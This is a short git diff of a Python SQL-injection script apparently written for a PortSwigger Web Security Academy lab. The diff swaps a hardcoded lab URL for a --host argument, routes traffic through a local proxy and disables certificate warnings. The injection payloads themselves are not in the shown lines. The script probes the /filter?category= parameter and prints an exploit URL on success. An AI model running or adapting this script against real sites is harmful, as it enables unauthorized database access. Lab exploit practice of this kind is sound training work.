@@ -4,15 +4,8 @@ import requests
 import re
 import sys
 from requests.utils import requote_uri
+import argparse
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
-target_url = "https://0aa700e803ab630ec0f092c200c3004f.web-security-academy.net"
-
-r = requests.Session()
-proxies = {
-    'https':'http://127.0.0.1:8080',
-    'http':'http://127.0.0.1:8080'
-}
 
 def sql_injection():
     url = target_url + "/filter?category="
@@ -36,4 +29,17 @@ def sql_injection():
             print("Exploit URL: ", malicious_url)
             sys.exit(0)
 
-sql_injection()
+if __name__ == "__main__":
+    
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--host', type=str, required=True)
+    args = parser.parse_args()
+
+    r = requests.Session()
+    target_url = args.host
+    proxies = {
+        'https':'http://127.0.0.1:8080',
+        'http':'http://127.0.0.1:8080'
+    }
+
+    sql_injection()
